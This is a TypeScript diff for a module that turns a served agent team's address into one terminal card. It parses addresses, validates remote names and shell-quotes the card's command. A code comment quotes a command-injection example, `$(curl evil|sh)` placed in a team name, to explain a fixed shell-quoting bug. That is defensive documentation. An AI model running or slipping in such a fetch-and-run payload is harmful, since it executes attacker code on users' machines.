@@ -1,99 +1,274 @@
-// IMPORT A TEMPLATE AS A SESSION — the caller's side of R30.
+// IMPORT A SERVED TEAM — the caller's side of R30.
 //
-// A template is a preset with one door (teams.ts entryAgentOf). Importing it
-// does NOT paste the whole team onto your canvas; it opens a session you talk
-// to through the orchestrator. The caller's workspace gets exactly ONE terminal
-// — the entry orch — and that terminal's input/output rides an HTTP call to the
-// served orchestrator, which runs the rest of the team on the owner's side.
+// A served team is reached through one door: its orch. Importing it does NOT
+// paste the whole team onto your canvas; the caller's workspace gets exactly
+// ONE terminal — the orch interface card — and that card's pixels are the
+// orch's real PTY, mirrored over the served door (resources/orch-line.mjs:
+// sign in, GET /line SSE, POST /line/raw). The team itself runs in the
+// session workspace the author's app mints for this caller; live transcripts
+// and teammates stay on the author's side.
 //
-// This module is the PURE PLAN: given a template and where it is served, it
-// says what workspace and what single terminal to create, and the command that
-// terminal runs to reach the orch. The wiring (create workspace, place node)
-// lives in index.ts; the interactive HTTP harness that command names is the
-// remote-teammate-card (call-client.ts). Kept pure so the plan is testable
-// against a fixture with no app, no network, no pty.
+// This module is the PURE PLAN: given a served address and the public face it
+// answers with, it says what single terminal to place and the command that
+// terminal runs. The wiring (fetch the face, place the node) lives in
+// index.ts. Kept pure so the plan is testable with no app, no network, no pty.
 
-import type { CanvasNode, TerminalNodeData } from '../shared/model'
-import { entryAgentOf, type TeamSnapshot } from './teams'
+import type { CanvasNode, ServedSessionFacts, TerminalNodeData } from '../shared/model'
 
-/** Where a template is served — the origin and workspace slug of the owner. */
+/** Where a team is served — the origin and slug from the author's address. */
 export interface ServeTarget {
-  /** The owner's listener origin, e.g. https://drej.cookrew.dev */
+  /** The author's listener origin, e.g. http://192.168.1.20:8639 */
   origin: string
-  /** The owner's workspace slug the service is mounted under. */
+  /** The slug the service is mounted under. */
   slug: string
-}
-
-/** What importing a template produces. */
-export interface ImportPlan {
-  /** The caller's new session workspace name. */
-  workspaceName: string
-  /** The single terminal to place — the entry orchestrator, over HTTP. */
-  orch: {
-    name: string
-    /** The command the terminal runs: an HTTP call to the entry orch's ask. */
-    command: string
-    /** The ask endpoint, so a harness reads it without re-parsing the command. */
-    askUrl: string
-  }
+  /**
+   * The published name, `@handle/team`, when this door is REACHED THROUGH THE
+   * RELAY rather than dialled.
+   *
+   * The two are not variants of one address. A dialled door is a machine the
+   * caller can reach and its address says where; a relayed door is a machine
+   * nobody can reach and its name says who. Keeping them as separate fields
+   * rather than one clever string is what stops a relayed name from being
+   * pasted somewhere that will try to open a socket to it.
+   */
+  door?: string
 }
 
 /**
- * The address a caller reaches the entry orch at. One mount, the same one a
- * phone uses on LAN: /<slug>/agents/<name>/ask, now over the public origin.
+ * Where a bare `@handle/team` is assumed to live.
+ *
+ * A name with no origin is not ambiguous in practice — it came from the one
+ * registry the product ships pointing at — but it IS a default, so it is
+ * written down once here instead of being spelled out at each call site.
  */
-export function orchAskUrl(target: ServeTarget, orch: string): string {
-  const origin = target.origin.replace(/\/+$/, '')
-  return `${origin}/${target.slug}/agents/${encodeURIComponent(orch)}/ask`
+export const COOKREW_REGISTRY = 'https://cookrew.dev'
+
+const DOOR_NAME = /^@([a-z0-9](?:[a-z0-9-]{0,30}[a-z0-9])?)\/([a-z0-9](?:[a-z0-9-]{0,62}[a-z0-9])?)$/
+
+/** The public face `GET /<slug>/crew` answers with — what the owner published. */
+export interface ImportFace {
+  name: string
+  serviceId: string
+  slug: string
+  door: string
+  access: 'account' | 'paid'
+  priceUsd?: string
+  version: number
+  agents: number
+  /**
+   * Which rails this door will take money on. Stable identifiers only — the
+   * import sheet needs them to offer a choice before anyone is charged, and a
+   * paid door advertising none is a door that cannot currently sell.
+   */
+  paymentRails: readonly ('x402' | 'stripe')[]
 }
 
 /**
- * Plan the import. Throws only on a template with no agent to enter — a
- * template you cannot enter is not importable, and that must fail loudly rather
- * than produce an empty session.
+ * Parse the address a caller pastes: `http://host:port/slug`, or the bare
+ * `host:port/slug` an owner reads aloud. Refuses credentials, query, hash and
+ * anything that is not exactly one slug deep — the address IS the whole claim.
  */
-export function planImportSession(snapshot: TeamSnapshot, target: ServeTarget): ImportPlan {
-  const orch = entryAgentOf(snapshot)
-  if (!orch) {
-    throw new Error(`Template '${snapshot.name}' has no agent to enter — cannot import`)
+export function parseServeAddress(link: string): ServeTarget | null {
+  const trimmed = link.trim()
+  if (trimmed.length === 0) return null
+  // A bare published name, which is what an owner says out loud and what the
+  // card on their canvas offers to copy.
+  if (trimmed.startsWith('@')) {
+    const bare = DOOR_NAME.exec(trimmed)
+    // Refused here rather than falling through, because falling through is not
+    // harmless: `@DREJ/alpha` parses as a URL with empty credentials and a host
+    // called DREJ, so a malformed NAME would quietly become an ADDRESS and the
+    // app would open a socket to whatever answers there.
+    return bare ? { origin: COOKREW_REGISTRY, slug: bare[2], door: trimmed } : null
   }
-  const askUrl = orchAskUrl(target, orch)
-  return {
-    // A session, not a copy: named so the caller sees whose crew and that it is
-    // live, never confused with a local template.
-    workspaceName: `${snapshot.name} · session`,
-    orch: {
-      name: orch,
-      // The fixture-backed seam: `cookrew call <url>` is the interactive client
-      // (call-client.ts) that does the 401/402 ceremony then streams the ask.
-      // The command carries the address so the harness needs no side channel.
-      command: `cookrew call ${askUrl}`,
-      askUrl
+
+  const candidate = /^https?:\/\//.test(trimmed) ? trimmed : `http://${trimmed}`
+  try {
+    const url = new URL(candidate)
+    if (!['http:', 'https:'].includes(url.protocol)) return null
+    if (url.username || url.password || url.search || url.hash) return null
+    const segments = url.pathname.split('/').filter((part) => part.length > 0)
+    // https://cookrew.dev/@drej/alpha — a link someone was sent.
+    //
+    // The @ may be dropped ONLY on a registry we know, because that is the one
+    // place two segments is unambiguous: it is what the team's own page prints
+    // and what a person reads out. Anywhere else `/two/deep` is an address
+    // claiming more than one door, and refusing it is the older, better rule —
+    // a name that silently became an address is how the app ends up opening a
+    // socket to whatever answers there.
+    if (segments.length === 2) {
+      const first = decodeURIComponent(segments[0])
+      const known = url.origin === COOKREW_REGISTRY
+      if (!first.startsWith('@') && !known) return null
+      const name = `${first.startsWith('@') ? first : `@${first}`}/${decodeURIComponent(segments[1])}`
+      const parsed = DOOR_NAME.exec(name)
+      return parsed ? { origin: url.origin, slug: parsed[2], door: name } : null
     }
+    if (segments.length !== 1) return null
+    // ONE SEGMENT ON THE REGISTRY IS AN OWNER, never a door.
+    //
+    // A dialled door is somebody's own machine answering at /slug, and the
+    // registry is not that — it is a directory. Without this, cookrew.dev/drej
+    // read as both an owner and a door, and which one you got depended on the
+    // order the sheet happened to try them in.
+    if (url.origin === COOKREW_REGISTRY) return null
+    const slug = segments[0]
+    if (!/^[a-z0-9]+(?:-[a-z0-9]+)*$/.test(slug)) return null
+    return { origin: url.origin, slug }
+  } catch {
+    return null
+  }
+}
+
+/** An owner, rather than one of their teams. */
+export interface AccountTarget {
+  /** The registry that knows them. */
+  origin: string
+  /** Their handle, without the @. */
+  handle: string
+}
+
+const HANDLE_ONLY = /^@?([a-z0-9](?:[a-z0-9-]{0,30}[a-z0-9])?)$/
+
+/**
+ * Parse an OWNER's address — `@drej`, or a link to their page.
+ *
+ * Separate from parseServeAddress because the two answer different questions
+ * and one function returning either would make every call site ask "which did
+ * I get". A one-segment path is genuinely ambiguous — on a dialled door it is
+ * a team's slug — so a bare handle must carry its @, and a link is only read
+ * as an account on a registry we know.
+ */
+export function parseAccountAddress(link: string): AccountTarget | null {
+  const trimmed = link.trim()
+  if (trimmed.length === 0) return null
+  if (trimmed.startsWith('@')) {
+    const bare = HANDLE_ONLY.exec(trimmed)
+    return bare ? { origin: COOKREW_REGISTRY, handle: bare[1] } : null
+  }
+  const candidate = /^https?:\/\//.test(trimmed) ? trimmed : `https://${trimmed}`
+  try {
+    const url = new URL(candidate)
+    if (!['http:', 'https:'].includes(url.protocol)) return null
+    if (url.username || url.password || url.search || url.hash) return null
+    if (url.origin !== COOKREW_REGISTRY) return null
+    const segments = url.pathname.split('/').filter((part) => part.length > 0)
+    if (segments.length !== 1) return null
+    const parsed = HANDLE_ONLY.exec(decodeURIComponent(segments[0]))
+    return parsed ? { origin: url.origin, handle: parsed[1] } : null
+  } catch {
+    return null
   }
 }
 
 /**
- * The terminal node the plan places. A normal terminal card — same idiom the
+ * POSIX single-quoting — the ONLY safe way to put a value in this command.
+ *
+ * A terminal's command IS run through a shell: DirectMultiplexer spawns
+ * `$SHELL -l -c <command>` and tmux wraps it in `sh -c`. JSON.stringify was
+ * used here first and is NOT sufficient: it escapes " and \ but leaves $ and
+ * ` live inside the resulting double quotes, so a served door answering with
+ * `{"name": "Team $(curl evil|sh)"}` executed that as the owner, unsandboxed,
+ * the moment the card was placed. Single quotes have no expansions at all;
+ * the only escape needed is for the quote itself.
+ */
+function shellQuote(value: string): string {
+  return `'${value.replaceAll("'", `'\\''`)}'`
+}
+
+/**
+ * A name is remote, attacker-controlled data. Even with quoting airtight, it
+ * is displayed, persisted and passed as argv, so it is bounded and stripped of
+ * control characters here — one narrow shape, refused rather than mangled.
+ */
+export function safeFaceName(name: unknown): string | null {
+  if (typeof name !== 'string') return null
+  const trimmed = name.trim()
+  if (trimmed.length === 0 || trimmed.length > 64) return null
+  // eslint-disable-next-line no-control-regex
+  if (/[\x00-\x1F\x7F]/.test(trimmed)) return null
+  // A name that begins like a flag becomes argv of the line script; refused
+  // rather than letting a door's choice of name read as an option.
+  if (trimmed.startsWith('-')) return null
+  return trimmed
+}
+
+/** The face a served door answered with, validated before anything uses it. */
+export function validateFace(value: unknown): ImportFace | null {
+  if (typeof value !== 'object' || value === null) return null
+  const raw = value as Record<string, unknown>
+  const name = safeFaceName(raw.name)
+  const door = safeFaceName(raw.door)
+  if (name === null || door === null) return null
+  if (raw.access !== 'account' && raw.access !== 'paid') return null
+  const serviceId = typeof raw.serviceId === 'string' ? raw.serviceId.slice(0, 128) : ''
+  const slug = typeof raw.slug === 'string' ? raw.slug.slice(0, 128) : ''
+  const priceUsd = typeof raw.priceUsd === 'string' ? raw.priceUsd.slice(0, 32) : undefined
+  const rails = Array.isArray(raw.paymentRails) ? raw.paymentRails : []
+  return {
+    name,
+    serviceId,
+    slug,
+    door,
+    access: raw.access,
+    ...(priceUsd !== undefined ? { priceUsd } : {}),
+    version: Number.isFinite(raw.version) ? (raw.version as number) : 1,
+    agents: Number.isFinite(raw.agents) ? (raw.agents as number) : 0,
+    paymentRails: rails.filter((rail): rail is 'x402' | 'stripe' => rail === 'x402' || rail === 'stripe')
+  }
+}
+
+/**
+ * The placed card's command. Every value is shell-quoted (see shellQuote — the
+ * command runs through a shell), and no payment state is present: a reference
+ * is supplied interactively in the live line, never persisted into node data.
+ */
+export function orchLineCommand(script: string, target: ServeTarget, name: string): string {
+  // A RELAYED DOOR CARRIES NO ADDRESS, and that is deliberate. The caller's end
+  // of the relay runs on a loopback port that changes with every app restart,
+  // so a command with a port baked into it is a card that works today and is
+  // dead tomorrow. The name is the durable thing; the card resolves the rest.
+  const args = target.door
+    ? [script, '--door', target.door, '--name', name]
+    : [script, '--origin', target.origin, '--slug', target.slug, '--name', name]
+  return `node ${args.map(shellQuote).join(' ')}`
+}
+
+/**
+ * The terminal node an import places. A normal terminal card — same idiom the
  * caller already knows — whose backend happens to be a remote orch. `orch` is
- * true because to the caller this IS the orchestrator; `role` names it so the
- * card reads as the crew, not a bare shell.
+ * true because to the caller this IS the orchestrator; the name is the team's,
+ * so the card reads as the team, not a bare shell.
  */
 export function orchTerminalNode(
-  plan: ImportPlan,
+  face: ImportFace,
+  target: ServeTarget,
+  script: string,
   id: string,
   cwd: string,
-  position: CanvasNode['position']
+  position: CanvasNode['position'],
+  /** What the caller was told and paid at the gate. See ServedSessionFacts. */
+  session?: Omit<ServedSessionFacts, 'origin' | 'slug'>
 ): TerminalNodeData {
   return {
     kind: 'terminal',
     id,
-    name: plan.orch.name,
+    name: face.name,
     preset: 'Remote',
-    command: plan.orch.command,
+    command: orchLineCommand(script, target, face.name),
     cwd,
     orch: true,
     role: null,
+    ...(session
+      ? {
+          servedSession: {
+            origin: target.origin,
+            slug: target.slug,
+            ...(target.door ? { door: target.door } : {}),
+            ...session
+          }
+        }
+      : {}),
     position,
     size: { width: 420, height: 300 }
   }
